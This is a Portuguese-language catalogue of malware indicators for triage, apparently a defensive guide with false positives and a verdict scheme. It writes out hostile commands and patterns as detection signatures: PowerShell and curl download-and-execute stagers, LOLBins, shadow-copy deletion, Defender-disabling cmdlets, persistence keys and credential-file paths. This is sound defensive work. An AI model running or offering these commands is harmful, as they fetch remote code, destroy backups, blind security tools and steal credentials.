# Catálogo de Padrões Suspeitos

Cada padrão traz o que significa e o **falso positivo** correspondente. Um indicador
isolado quase nunca fecha veredito — o que fecha é a **combinação**.

---

## Download-and-execute (stager)

| Padrão | Onde |
|---|---|
| `IEX (New-Object Net.WebClient).DownloadString('http://...')` | PowerShell |
| `iwr <url> \| iex` / `irm <url> \| iex` | PowerShell |
| `curl -s <url> \| bash` / `wget -qO- <url> \| sh` | Shell |
| `certutil -urlcache -split -f <url> <out>` | LOLBin de download |
| `bitsadmin /transfer` | LOLBin de download |
| `mshta http://...` / `regsvr32 /i:http://... scrobj.dll` | LOLBin execução remota |
| `URLDownloadToFile` | API Win32 em binário |

**Falso positivo:** instaladores oficiais usam `curl | bash` (rustup, nvm, Docker). O que
diferencia é o **domínio** e o contexto. `curl https://sh.rustup.rs | sh` é legítimo;
`curl http://185.x.x.x:8080/a | sh` não é.

---

## Ofuscação e codificação

| Padrão | Significa |
|---|---|
| `powershell -enc` / `-EncodedCommand` | Comando base64 UTF-16LE escondido |
| `-w hidden -nop -ep bypass -noni` | Sem janela, sem perfil, sem política, não-interativo |
| `FromBase64String`, `atob(`, `Buffer.from(x,'base64')` | Payload codificado |
| `[char]0x41 + [char]0x42` / `-join` de array de int | String montada byte a byte |
| `String.fromCharCode(...)` | Idem, em JS |
| `\x41\x42\x43` extenso em script | Hex escape |
| Linha única > 1000 caracteres em `.js`/`.py`/`.sh` | Payload inline |
| Variáveis `_0x4f2a` (hex names) | Saída de javascript-obfuscator |
| `${env:COmSPec}[4,15,25]-join''` | Montagem de string a partir de env var |

**Falso positivo:** minificação e bundling (webpack, terser) produzem linhas gigantes e
nomes curtos legitimamente. Diferença: bundle minificado tem estrutura reconhecível e
não decodifica pra comando de sistema. **Sempre decodifique antes de julgar.**

---

## Persistência (Windows)

| Padrão | Mecanismo |
|---|---|
| `reg add HKCU\...\CurrentVersion\Run` | Autorun no login |
| `schtasks /create /sc onlogon /ru SYSTEM` | Tarefa agendada |
| `New-Service` / `sc create` com binário em AppData | Serviço |
| `.lnk` na pasta Startup | Autorun clássico |
| `__EventFilter` + `CommandLineEventConsumer` (WMI) | Persistência fileless |
| `Image File Execution Options` + `Debugger` | Hijack de processo |
| Modificação de `Winlogon\Shell` ou `Userinit` | Persistência de sessão |
| DLL search order hijacking (DLL ao lado do exe) | Sequestro de carregamento |

## Persistência (Linux)

`crontab -e`, `/etc/cron.d/*`, `~/.bashrc`/`~/.profile`, unit em `/etc/systemd/system/`,
`~/.ssh/authorized_keys`, `LD_PRELOAD` em `/etc/ld.so.preload`, `@reboot` no cron.

---

## Injeção de processo e evasão

| Padrão | Significa |
|---|---|
| `VirtualAlloc` + `WriteProcessMemory` + `CreateRemoteThread` | Injeção clássica |
| `NtUnmapViewOfSection` + `SetThreadContext` | Process hollowing |
| `QueueUserAPC` | APC injection |
| `Add-MpPreference -ExclusionPath/-ExclusionProcess` | Cegando o Defender |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Desligando o Defender |
| `netsh advfirewall firewall add rule` | Abrindo caminho pro C2 |
| `amsi` / `AmsiScanBuffer` em string | Tentativa de bypass de AMSI |
| `IsDebuggerPresent`, `CheckRemoteDebuggerPresent`, `GetTickCount` em loop | Anti-análise |
| Verificação de VM (`VMware`, `VBox`, `QEMU` em strings) | Anti-sandbox |
| `Sleep(600000)` no início | Timeout de sandbox |

**Falso positivo:** `VirtualAlloc` sozinho aparece em qualquer runtime, JIT, packer ou
debugger legítimo. O que conta é o trio completo + destino do buffer.

---

## Roubo de credencial (infostealer)

Caminhos e nomes que aparecem em strings:
- `Login Data`, `Local State`, `Web Data`, `Cookies` (Chromium)
- `logins.json`, `key4.db`, `cert9.db` (Firefox)
- `wallet.dat`, `keystore`, `UTC--`, `MetaMask`, `Exodus`, `Electrum`
- `\.ssh\id_rsa`, `.aws\credentials`, `.docker\config.json`, `.npmrc`, `.git-credentials`
- `%APPDATA%\discord\Local Storage\leveldb` (token do Discord)
- `Telegram Desktop\tdata`
- `.env`, `credentials.json`, `secrets.yaml`

Combinação de vários desses + rotina de compactação + POST HTTP = **infostealer confirmado**.

---

## Ransomware

`vssadmin delete shadows /all /quiet`, `wmic shadowcopy delete`,
`bcdedit /set recoveryenabled No`, `bcdedit /set bootstatuspolicy ignoreallfailures`,
`wbadmin delete catalog`, `CryptEncrypt`/`CryptGenKey`, `BCryptEncrypt`,
extensão nova em massa, arquivo `README_TO_DECRYPT.txt`/`HOW_TO_RECOVER`, enumeração de
drives de rede, `taskkill` em processos de banco (sqlservr, oracle) e de backup.

---

## Cryptominer

Strings de pool: `stratum+tcp://`, `pool.`, `xmrig`, `nanopool`, `f2pool`, `nicehash`,
`--donate-level`, `randomx`, endereço de carteira Monero (começa com `4` ou `8`, 95 chars).
Sintoma: CPU/GPU em 100% constante, processo com nome de sistema em caminho errado
(`C:\Windows\Temp\svchost.exe`), throttle quando o Gerenciador de Tarefas abre.

**PUA:** miner instalado pelo próprio usuário é PUA, não malware — mas em máquina
corporativa continua sendo violação de política.

---

## C2 (command and control)

- IP cru em porta alta não padrão (`:4444`, `:8080`, `:1337`, `:5555`)
- Domínio dinâmico: `*.duckdns.org`, `*.no-ip.org`, `*.ngrok-free.app`, `*.serveo.net`
- Webhook do Discord (`discord.com/api/webhooks/...`) ou Bot API do Telegram
  (`api.telegram.org/bot<token>/sendDocument`) — exfiltração barata, muito comum
- Pastebin/GitHub Gist raw como fonte de configuração ou estágio 2
- `.onion` (Tor)
- Beaconing: requisições em intervalo regular (ex.: exatos 60s) pro mesmo host
- DGA: muitos domínios de aparência aleatória (`kjhwqoiuh.top`)
- DNS tunneling: consultas TXT longas e frequentes pro mesmo domínio

---

## Webshell (encontrado em servidor web)

```bash
grep -rnE 'eval\(\$_(POST|GET|REQUEST|COOKIE)|assert\(\$_|preg_replace\(.*/e|base64_decode\(\$_|shell_exec|passthru\(|system\(\$_|`\$_' /var/www --include='*.php' | head -30
find /var/www -name '*.php' -mmin -10080 -ls
```

Sinais: PHP num diretório de uploads/imagens, arquivo com nome aleatório
(`x7f3.php`), arquivo `.php` com timestamp destoante dos vizinhos, `.jpg` que o `file`
identifica como PHP, one-liner denso no fim de um arquivo legítimo (backdoor anexado).

---

## Supply chain (npm/pip)

- `postinstall`/`preinstall`/`prepare` executando `node -e`, `curl`, `python -c`, base64
- Pacote publicado dias atrás com pico de download
- Typosquatting: `crossenv`/`cross-env`, `python-dateutil`/`dateutil`, `requests`/`request`
- Mantenedor novo publicando após transferência de propriedade
- Release no registry sem commit correspondente no repositório
- Dependência no lockfile ausente do manifesto (dependency confusion)
- Leitura de `process.env` inteiro seguida de POST — exfiltração de segredo de CI
- Binário `.node`/`.so`/`.pyd` sem fonte correspondente

---

## Isca de engenharia social (o vetor, não o payload)

- Extensão dupla: `orcamento.pdf.exe`, `nota_fiscal.docx.scr`
- Caractere RLO U+202E no nome invertendo a exibição
- ZIP com senha, senha no corpo do e-mail (evasão de gateway)
- `.iso`/`.img`/`.vhd` anexado (burla a marca MOTW)
- `.lnk` disfarçado de documento
- "Habilite a edição/conteúdo para visualizar"
- **"Cole este comando no Win+R / PowerShell para verificar que você é humano"** —
  ClickFix/fake CAPTCHA. Nenhum site legítimo pede isso. Nunca.
- Urgência + autoridade: "seu acesso expira hoje", "departamento jurídico", "boleto vencendo"
- Remetente com domínio parecido com o do fornecedor real (fraude de boleto/PIX)

---

## Como combinar

Um indicador = investigar. Combinação = veredito.

**MALICIOUS com alta confiança:**
download remoto + execução dinâmica + persistência + evasão de AV.

**SUSPICIOUS:**
ofuscação pesada sem justificativa + acesso à rede, mas sem payload decodificado.

**UNKNOWN:**
blob que não foi possível decodificar com as ferramentas disponíveis. Diga o que falta
em vez de chutar.

**CLEAN:**
nada encontrado **no escopo analisado** — sempre declare qual foi o escopo.
